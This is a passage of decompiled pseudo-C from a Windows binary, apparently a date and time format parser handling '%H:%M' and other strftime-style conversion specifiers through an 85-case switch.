bVar38;\n                    uVar8 = uVar6;\n                    if (pauVar40 != NULL && bVar38) {\n                        if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                            uVar13 = **pauVar40[1];\n                        }\n                        else {\n                            in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | uVar6;\n                            ppauStackY576 = 0x14006216d;\n                            uVar13 = (**(**pauVar40 + 0x48))(pauVar40);\n                            uVar6 = in_stack_fffffffffffffe34;\n                        }\n                        bVar38 = false;\n                        uVar8 = uVar6;\n                        if (uVar13 != -1) goto code_r0x000140061ec0;\n                        pauVar40 = NULL;\n                        uVar8 = 0;\n                        uStack392 = 0;\n                        uStack388 = 0;\n                        uVar13 = uVar13 & 0xffffff00 | (piVar37 != NULL && bVar43);\n                        uVar7 = 0;\n                        if (piVar37 == NULL || !bVar43) goto code_r0x000140061ed1;\ncode_r0x000140061f88:\n                        uVar8 = uVar7;\n                        ppauVar16 = uVar13;\n                        if (piVar37[2] < piVar37[3]) {\n                            iVar9 = *piVar37[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | uVar8;\n                            ppauStackY576 = 0x140062156;\n                            iVar9 = (**(*piVar37 + 0x48))(piVar37);\n                            uVar8 = in_stack_fffffffffffffe34;\n                        }\n                        if (iVar9 == -1) {\n                            uStack408 = 0;\n                            uStack404 = 0;\n                            piVar37 = NULL;\n                        }\n                        else {\n                            ppauVar16 = NULL;\n                        }\n                    }\n                    else {\ncode_r0x000140061ec0:\n                        uVar6 = bVar38;\n                        bVar38 = piVar37 != NULL && bVar43;\n                        uVar13 = uVar13 & 0xffffff00 | bVar38;\n                        uVar7 = uVar8;\n                        if (bVar38) goto code_r0x000140061f88;\ncode_r0x000140061ed1:\n                        ppauVar16 = unaff_RSI & 0xffffff00 | bVar43;\n                    }\n                    if (uVar6 == ppauVar16) goto code_r0x000140061d4d;\n                    if (uVar8 != 0) {\n                        if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                            iVar9 = **pauVar40[1];\n                        }\n                        else {\n                            ppauStackY576 = 0x140062189;\n                            iVar9 = (**(**pauVar40 + 0x48))(pauVar40);\n                        }\n                        if (iVar9 == -1) {\n                            uStack392 = 0;\n                            uStack388 = 0;\n                            pauVar40 = NULL;\n                        }\n                    }\n                    ppauStackY576 = 0x140061ef7;\n                    cVar5 = (**(*ppauVar18)[1])(ppauVar18);\n                    if (cVar5 == '\\0') goto code_r0x000140061d4d;\n                    if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                        iVar19 = *pauVar40[1] + 2;\n                        *pauVar40[1] = iVar19;\n                    }\n                    else {\n                        ppauStackY576 = 0x140062071;\n                        iVar19 = (**(**pauVar40 + 0x50))(pauVar40);\n                    }\n                    uVar33 = 0xffffffff;\n                    uStack384 = 0xffff;\n                } while( true );\n            }\n            cVar5 = pauVar40 != NULL;\n            ppauStackY576 = 0x140061cc9;\n            uVar13 = (**(*ppauVar18)[4])(ppauVar18);\n            arg1_00 = uVar13;\n            bVar38 = bVar42 && cVar5;\n            if (bVar38) {\n                if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                    iVar9 = **pauVar40[1];\n                    cVar5 = bVar38;\n                }\n                else {\n                    in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | bVar38;\n                    ppauStackY576 = 0x14006372d;\n                    iVar9 = (**(**pauVar40 + 0x48))(pauVar40);\n                    cVar5 = in_stack_fffffffffffffe34;\n                }\n                if (iVar9 == -1) {\n                    uStack392 = 0;\n                    uStack388 = 0;\n                    cVar5 = '\\0';\n                    pauVar40 = NULL;\n                }\n            }\n            ppauStackY576 = 0x140061ce4;\n            iVar9 = (**(*ppauVar18)[4])(ppauVar18);\n            if (uVar13 == iVar9) {\ncode_r0x000140061e80:\n                uVar33 = 0xffffffff;\n                ppauStackY576 = 0x140061e8d;\n                fcn.1400960e0(pauVar40);\n                piVar37 = CONCAT44(uStack404, uStack408);\n                uStack384 = 0xffff;\n            }\n            else {\n                ppauStackY576 = 0x140061cfc;\n                uVar13 = (**(*ppauVar18)[3])(ppauVar18);\n                arg1_00 = uVar13;\n                if ((bVar42) && (cVar5 != '\\0')) {\n                    if (*pauVar40[1] < *(pauVar40[1] + 8)) {\n                        iVar9 = **pauVar40[1];\n                    }\n                    else {\n                        ppauStackY576 = 0x140062686;\n                        iVar9 = (**(**pauVar40 + 0x48))(pauVar40);\n                    }\n                    if (iVar9 == -1) {\n                        uStack392 = 0;\n                        uStack388 = 0;\n                    }\n                }\n                ppauStackY576 = 0x140061d19;\n                iVar9 = (**(*ppauVar18)[3])(ppauVar18);\n                pauVar40 = CONCAT44(uStack388, uStack392);\n                if (uVar13 == iVar9) goto code_r0x000140061e80;\n                uVar47 = 4;\n                pauVar40 = CONCAT44(uStack388, uStack392);\n                uStack368 = 4;\n                piVar37 = CONCAT44(uStack404, uStack408);\n            }\n            goto code_r0x000140061d4d;\n        }\n        arg3 = NULL;\n        ppauStackY576 = 0x140061e3b;\n        ppauVar29 = ppauVar18;\n        cVar5 = (**(*ppauVar18)[6])();\n        uStack364 = 0;\n        if ((cVar5 == 'E') || (cVar5 == 'O')) {\n            arg3 = NULL;\n            puVar36 = puVar36 + 2;\n            ppauStackY576 = 0x14006202f;\n            ppauVar29 = ppauVar18;\n            cVar5 = (**(*ppauVar18)[6])();\n            uVar8 = cVar5 - 0x25;\n            pauVar40 = auStack424;\n            auVar45 = extraout_XMM0_00;\n            if (uVar8 < 0x55) goto code_r0x000140061e65;\ncode_r0x00014006203a:\n            uStack368 = 4;\n            pauVar40 = CONCAT44(uStack388, uStack392);\n            uVar47 = 4;\n            goto code_r0x000140062058;\n        }\n        uVar8 = cVar5 - 0x25;\n        puVar36 = puVar36 + 1;\n        pauVar40 = auStack424;\n        auVar45 = extraout_XMM0;\n        if (0x54 < uVar8) goto code_r0x00014006203a;\ncode_r0x000140061e65:\n        uVar24 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n        pcVar32 = 0x1400feb58;\n        iVar14 = *(uVar8 * 4 + 0x1400feb58);\n        uVar20 = iVar14;\n        cVar41 = 0xfffffffebff014a7 < uVar20;\n        piVar21 = uVar20 + 0x1400feb58;\n        bVar38 = piVar21 < 0;\n        cVar5 = piVar21;\n        uVar13 = piVar21;\n        uVar6 = ppauVar29;\n        cVar34 = uVar33 >> 8;\n        uVar46 = in_stack_fffffffffffffdf8 >> 0x20;\n        ppauVar30 = ppauVar29;\n        auStack424 = pauVar40;\n    // switch table (85 cases) at 0x1400feb58\n        switch(uVar8) {\n        case 0:\n            ppauStackY576 = 0x140062758;\n            iVar9 = fcn.1400240d0(&stack0xfffffffffffffe78);\n            ppauStackY576 = 0x140062769;\n            iVar11 = (**(*ppauVar18)[5])(ppauVar18);\n            auStack424 = pauVar40;\n            if (iVar9 == iVar11) {\n                pauVar40 = CONCAT44(uStack388, uStack392);\n                uVar33 = 0xffffffff;\n                ppauStackY576 = 0x1400637db;\n                fcn.1400960e0(pauVar40);\n                auStack424 = 0xffffffff;\n                uStack384 = 0xffff;\n            }\n            else {\ncode_r0x000140062772:\n                uVar33 = uStack384;\n                uStack368 = 4;\n                pauVar40 = CONCAT44(uStack388, uStack392);\n                uVar47 = 4;\n            }\n            break;\n        default:\n            goto code_r0x00014006203a;\n        case 0x1c:\n        case 0x3c:\n            iVar19 = *(puVar17 + 0x10);\n            uStack312 = *(iVar19 + 0x88);\n            uStack308 = *(iVar19 + 0x8c);\n            uStack304 = *(iVar19 + 0x90);\n            uStack300 = *(iVar19 + 0x94);\n            ppauStack296 = *(iVar19 + 0x98);\n            uStack288 = *(iVar19 + 0xa0);\n            uStack284 = *(iVar19 + 0xa4);\n            uStack344 = *(iVar19 + 0x68);\n            uStack340 = *(iVar19 + 0x6c);\n            uStack336 = *(iVar19 + 0x70);\n            uStack332 = *(iVar19 + 0x74);\n            uStack328 = *(iVar19 + 0x78);\n            uStack324 = *(iVar19 + 0x7c);\n            uStack320 = *(iVar19 + 0x80);\n            uStack316 = *(iVar19 + 0x84);\n            in_XMM1 = *(iVar19 + 0xa8);\n            uStack264 = *(iVar19 + 0xb8);\n            uStack260 = *(iVar19 + 0xbc);\n            uStack256 = *(iVar19 + 0xc0);\n            uStack252 = *(iVar19 + 0xc4);\n            pauStack360 = *(iVar19 + 0x58);\n            piStack352 = *(iVar19 + 0x60);\n            in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = NULL;\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x14006257a;\n            auStack280 = in_XMM1;\n            fcn.140060e80(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                          &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 0xe, in_stack_00000028, \n                          in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, noname_10, pauVar31, puVar17, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar47), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 3) = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar19 = *(puVar17 + 0x10);\n            uStack264 = *(iVar19 + 0x128);\n            uStack260 = *(iVar19 + 300);\n            uStack256 = *(iVar19 + 0x130);\n            uStack252 = *(iVar19 + 0x134);\n            uStack248 = *(iVar19 + 0x138);\n            uStack244 = *(iVar19 + 0x13c);\n            uStack240 = *(iVar19 + 0x140);\n            uStack236 = *(iVar19 + 0x144);\n            uStack232 = *(iVar19 + 0x148);\n            uStack228 = *(iVar19 + 0x14c);\n            uStack224 = *(iVar19 + 0x150);\n            uStack220 = *(iVar19 + 0x154);\n            auStack216 = *(iVar19 + 0x158);\n            in_XMM1 = *(iVar19 + 0x168);\n            uStack184 = *(iVar19 + 0x178);\n            uStack180 = *(iVar19 + 0x17c);\n            uStack176 = *(iVar19 + 0x180);\n            uStack172 = *(iVar19 + 0x184);\n            ppauStack296 = *(iVar19 + 0x108);\n            uStack288 = *(iVar19 + 0x110);\n            uStack284 = *(iVar19 + 0x114);\n            auStack280 = *(iVar19 + 0x118);\n            uStack344 = *(iVar19 + 0xd8);\n            uStack340 = *(iVar19 + 0xdc);\n            uStack336 = *(iVar19 + 0xe0);\n            uStack332 = *(iVar19 + 0xe4);\n            uStack328 = *(iVar19 + 0xe8);\n            uStack324 = *(iVar19 + 0xec);\n            uStack320 = *(iVar19 + 0xf0);\n            uStack316 = *(iVar19 + 0xf4);\n            uStack312 = *(iVar19 + 0xf8);\n            uStack308 = *(iVar19 + 0xfc);\n            uStack304 = *(iVar19 + 0x100);\n            uStack300 = *(iVar19 + 0x104);\n            pauStack360 = *(iVar19 + 200);\n            piStack352 = *(iVar19 + 0xd0);\n            in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            in_stack_fffffffffffffdf8 = NULL;\n            ppauStackY576 = 0x14006230d;\n            auStack200 = in_XMM1;\n            fcn.140060e80(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                          &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 0x18, in_stack_00000028, \n                          in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, noname_10, pauVar31, puVar17, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar47), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 2) = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            }\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 99);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x1400632a6;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                *(in_stack_00000048 + 4) = uStack364;\n                arg1_00 = in_stack_00000048;\n            }\n            break;\n        case 0x1f:\n            ppauStackY576 = 0x1400633f1;\n            (**((*ppauVar18)[5] + 8))(ppauVar18, 0x1400feb3e, \"%H:%M\", &stack0xfffffffffffffe98);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x0001400627e0;\n        case 0x23:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x17);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140063379;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 1) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0xc);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x1400636a9;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 1) = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n            }\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x3b);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x1400635db;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 4) = uStack364;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x2d:\n            ppauStackY576 = 0x14006351c;\n            (**((*ppauVar18)[5] + 8))(ppauVar18, \"%H:%M\", 0x1400feb4d, &stack0xfffffffffffffe98);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x0001400626d4;\n        case 0x2e:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x3c);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x1400634b0;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x2f:\n            ppauStackY576 = 0x1400631e7;\n            (**((*ppauVar18)[5] + 8))(ppauVar18, 0x1400feb4d, 0x1400feb56, &stack0xfffffffffffffe98);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            goto code_r0x0001400626d4;\n        case 0x30:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x35);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140062d7b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe34 = *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x20 | in_stack_fffffffffffffe34 & 0xffc0ffdf;\n                arg1_00 = in_stack_00000048;\n            }\n            break;\n        case 0x32:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x35);\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140062c8b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe34 = *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x40 | in_stack_fffffffffffffe34 & 0xffc0ffbf;\n                arg1_00 = in_stack_00000048;\n            }\n            break;\n        case 0x33:\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            goto code_r0x0001400626d4;\n        case 0x34:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 9999);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140062b51;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0x14) = uStack364 - 0x76c;\n                in_stack_fffffffffffffe34 = in_stack_fffffffffffffe34 & 0xffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n                arg1_00 = in_stack_00000048;\n            }\n            break;\n        case 0x35:\n            ppauStackY576 = 0x140062878;\n            fcn.1400240d0(&stack0xfffffffffffffe78);\n            auStack424 = *ppauVar18;\n            ppauStackY576 = 0x14006288c;\n            cVar5 = (**auStack424[1])(ppauVar18);\n            if (cVar5 == '\\0') goto code_r0x000140062772;\n            pauVar40 = &stack0xfffffffffffffe38;\n            ppauVar16 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = NULL;\n            arg1_00 = &stack0xfffffffffffffe98;\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            ppauStackY576 = 0x140062924;\n            in_stack_fffffffffffffe08 = ppauVar16;\n            pauVar31 = pauVar40;\n            fcn.140060e80(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar40, arg1_00, *0x140102cf0, 0xe\n                          , in_stack_00000028, ppauVar16, in_stack_fffffffffffffe10, noname_10, pauVar40, puVar17, \n                          CONCAT44(in_stack_fffffffffffffe34, uVar47), CONCAT44(uStack404, uStack408), \n                          SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            ppauStackY576 = 0x14006294f;\n            cVar5 = fcn.140024020(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n            uVar47 = uStack368;\n            if ((cVar5 == '\\0') && ((uStack368 | pauStack360) == 0)) {\n                ppauStackY576 = 0x140062977;\n                iVar9 = fcn.1400240d0(&stack0xfffffffffffffe78);\n                ppauStackY576 = 0x140062988;\n                iVar11 = (**(*ppauVar18)[5])(ppauVar18, 0x2d);\n                uVar46 = in_stack_fffffffffffffdf8 >> 0x20;\n                if (iVar9 != iVar11) {\n                    ppauStackY576 = 0x140062995;\n                    iVar9 = fcn.1400240d0(&stack0xfffffffffffffe78);\n                    ppauStackY576 = 0x1400629a6;\n                    iVar11 = (**(*ppauVar18)[5])(ppauVar18);\n                    uVar46 = in_stack_fffffffffffffdf8 >> 0x20;\n                    if (iVar9 != iVar11) goto code_r0x00014006265b;\n                }\n                pauVar40 = pauVar31;\n                ppauStackY576 = 0x140062a19;\n                pauVar31 = pauVar40;\n                fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar40);\n                in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x3b);\n                in_stack_fffffffffffffe38 =\n                     CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n                uStack384 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                auStack440 = CONCAT48(CONCAT22(uStack382, uStack416), auStack424);\n                auStack440_00 = CONCAT412(uStack380, auStack440);\n                ppauStackY576 = 0x140062a9e;\n                in_stack_fffffffffffffe08 = in_stack_00000028;\n                in_stack_fffffffffffffe10 = ppauVar16;\n                fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, pauVar40);\n                uStack384 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                uVar47 = uStack368;\n            }\n            goto code_r0x00014006265b;\n        case 0x3e:\n            auStack440_00 =\n                 CONCAT412(uStack380, CONCAT210(uStack382, CONCAT28(uStack384, CONCAT44(uStack388, uStack392))));\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\ncode_r0x0001400627e0:\n            ppauStackY576 = 0x140062821;\n            in_stack_fffffffffffffdf8 = in_stack_00000038;\n            in_stack_fffffffffffffe08 = in_stack_00000048;\n            fcn.140061b10(&stack0xfffffffffffffe58, arg2);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            }\n            break;\n        case 0x3f:\n        case 0x40:\n            ppauStackY576 = 0x140062395;\n            uVar10 = fcn.1400240d0(&stack0xfffffffffffffe78);\n            ppauStackY576 = 0x1400623a9;\n            cVar5 = (**(*ppauVar18)[1])(ppauVar18, 0x20, uVar10);\n            if (cVar5 != '\\0') {\n                ppauStackY576 = 0x1400637b4;\n                fcn.1400960e0(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffff;\n            }\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar46, 0x1f);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            ppauStackY576 = 0x140062432;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140060950(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uVar33 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar40 = auStack424;\n            uVar47 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0xc) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n                arg1_00 = in_stack_00000038;\n            }\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            